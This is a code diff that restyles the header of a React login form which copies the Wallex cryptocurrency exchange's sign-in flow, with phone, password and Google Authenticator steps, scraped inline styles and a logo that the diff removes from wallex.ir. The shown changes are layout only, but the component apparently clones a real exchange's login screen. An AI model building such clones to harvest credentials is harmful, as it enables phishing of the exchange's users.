@@ -823,131 +823,104 @@ export const LoginForm = () => {
         {/* Header */}
         <div
           style={{
+            alignItems: "center",
             display: "flex",
-            justifyContent: "space-between",
-            width: "100%",
+            justifyContent: "center",
+            minHeight: "48px",
+            paddingLeft: "6px",
+            paddingRight: "6px",
+            position: "relative",
           }}
         >
-          <div
-            style={{
-              alignItems: "flex-start",
-              display: "flex",
-              gap: "8px",
-            }}
-          >
-            {currentStep !== "phone" && currentStep !== "loading" && (
-              <button
-                tabIndex={0}
-                type="button"
-                onClick={handleBack}
+          {currentStep !== "phone" && currentStep !== "loading" && (
+            <button
+              tabIndex={0}
+              type="button"
+              onClick={handleBack}
+              style={{
+                alignItems: "center",
+                borderBottomLeftRadius: "50%",
+                borderBottomRightRadius: "50%",
+                borderColor: "rgba(0, 0, 0, 0.6)",
+                borderRadius: "50%",
+                borderTopLeftRadius: "50%",
+                borderTopRightRadius: "50%",
+                color: "rgba(0, 0, 0, 0.6)",
+                cursor: "pointer",
+                display: "flex",
+                flexShrink: "0",
+                fontSize: "24px",
+                justifyContent: "center",
+                lineHeight: "42px",
+                outlineColor: "rgba(0, 0, 0, 0.6)",
+                paddingBottom: "8px",
+                paddingLeft: "8px",
+                paddingRight: "8px",
+                paddingTop: "8px",
+                position: "absolute",
+                right: "0px",
+                textAlign: "center",
+                textDecorationColor: "rgba(0, 0, 0, 0.6)",
+                textEmphasisColor: "rgba(0, 0, 0, 0.6)",
+                transitionDuration: "0.15s",
+                transitionProperty: "background-color",
+                transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
+                userSelect: "none",
+                verticalAlign: "middle",
+                backgroundColor: "rgba(0, 0, 0, 0)",
+                border: "none",
+              }}
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                fill="none"
+                focusable="false"
+                aria-hidden="true"
+                viewBox="0 0 24 24"
                 style={{
-                  alignItems: "center",
-                  borderBottomLeftRadius: "50%",
-                  borderBottomRightRadius: "50%",
                   borderColor: "rgba(0, 0, 0, 0.6)",
-                  borderRadius: "50%",
-                  borderTopLeftRadius: "50%",
-                  borderTopRightRadius: "50%",
                   color: "rgba(0, 0, 0, 0.6)",
                   cursor: "pointer",
-                  display: "flex",
+                  fill: "rgba(0, 0, 0, 0.6)",
                   flexShrink: "0",
                   fontSize: "24px",
-                  justifyContent: "center",
+                  height: "24px",
                   lineHeight: "42px",
                   outlineColor: "rgba(0, 0, 0, 0.6)",
-                  position: "relative",
+                  overflowClipMargin: "content-box",
+                  overflowX: "hidden",
+                  overflowY: "hidden",
                   textAlign: "center",
                   textDecorationColor: "rgba(0, 0, 0, 0.6)",
                   textEmphasisColor: "rgba(0, 0, 0, 0.6)",
-                  transitionDuration: "0.15s",
-                  transitionProperty: "background-color",
+                  transitionDuration: "0.2s",
+                  transitionProperty: "fill",
                   transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                   userSelect: "none",
-                  verticalAlign: "middle",
-                  backgroundColor: "rgba(0, 0, 0, 0)",
-                  border: "none",
+                  width: "24px",
                 }}
               >
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  width="24"
-                  height="24"
-                  fill="none"
-                  focusable="false"
-                  aria-hidden="true"
-                  viewBox="0 0 24 24"
-                  style={{
-                    borderColor: "rgba(0, 0, 0, 0.6)",
-                    color: "rgba(0, 0, 0, 0.6)",
-                    cursor: "pointer",
-                    fill: "rgba(0, 0, 0, 0.6)",
-                    flexShrink: "0",
-                    fontSize: "24px",
-                    height: "24px",
-                    lineHeight: "42px",
-                    outlineColor: "rgba(0, 0, 0, 0.6)",
-                    overflowClipMargin: "content-box",
-                    overflowX: "hidden",
-                    overflowY: "hidden",
-                    textAlign: "center",
-                    textDecorationColor: "rgba(0, 0, 0, 0.6)",
-                    textEmphasisColor: "rgba(0, 0, 0, 0.6)",
-                    transitionDuration: "0.2s",
-                    transitionProperty: "fill",
-                    transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
-                    userSelect: "none",
-                    width: "24px",
-                  }}
-                >
-                  <path
-                    fill="currentColor"
-                    d="M14.96 5.4a.75.75 0 1 0-1.06 1.06l4.79 4.79H3.5a.75.75 0 0 0 0 1.5h15.19l-4.79 4.79a.75.75 0 1 0 1.06 1.06l6.07-6.07a.75.75 0 0 0 0-1.06z"
-                  ></path>
-                </svg>
-              </button>
-            )}
-            <span
-              style={{
-                fontWeight: "700",
-                fontSize: "16px",
-                color: "rgb(0, 0, 0)",
-              }}
-            >
-              {currentStep === "verify-phone"
-                ? "تائید شماره همراه"
-                : currentStep === "password"
-                  ? "رمز عبور"
-                  : currentStep === "google"
-                    ? "Google Authenticator"
-                    : "ورود"}
-            </span>
-          </div>
-
-          <a href="#">
-            <img
-              alt="صرافی خرید فروش ارزهای دیجیتال"
-              fetchpriority="high"
-              width="128"
-              height="24"
-              decoding="async"
-              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
-              style={{
-                aspectRatio: "auto 128 / 24",
-                borderColor: "rgba(0, 0, 0, 0)",
-                color: "rgba(0, 0, 0, 0)",
-                display: "inline",
-                height: "24px",
-                outlineColor: "rgba(0, 0, 0, 0)",
-                overflowClipMargin: "content-box",
-                overflowX: "clip",
-                overflowY: "clip",
-                textDecorationColor: "rgba(0, 0, 0, 0)",
-                textEmphasisColor: "rgba(0, 0, 0, 0)",
-                width: "128px",
-              }}
-            />
-          </a>
+                <path
+                  fill="currentColor"
+                  fillRule="evenodd"
+                  d="M8.47 4.47a.75.75 0 0 1 1.06 0l7 7a.75.75 0 0 1 0 1.06l-7 7a.75.75 0 0 1-1.06-1.06L14.94 12 8.47 5.53a.75.75 0 0 1 0-1.06"
+                  clipRule="evenodd"
+                />
+              </svg>
+            </button>
+          )}
+          <span
+            style={{
+              fontSize: "14px",
+              fontWeight: "700",
+              lineHeight: "24.01px",
+              textAlign: "center",
+            }}
+          >
+            ورود و ثبت‌نام
+          </span>
         </div>
 
         {/* Separator */}
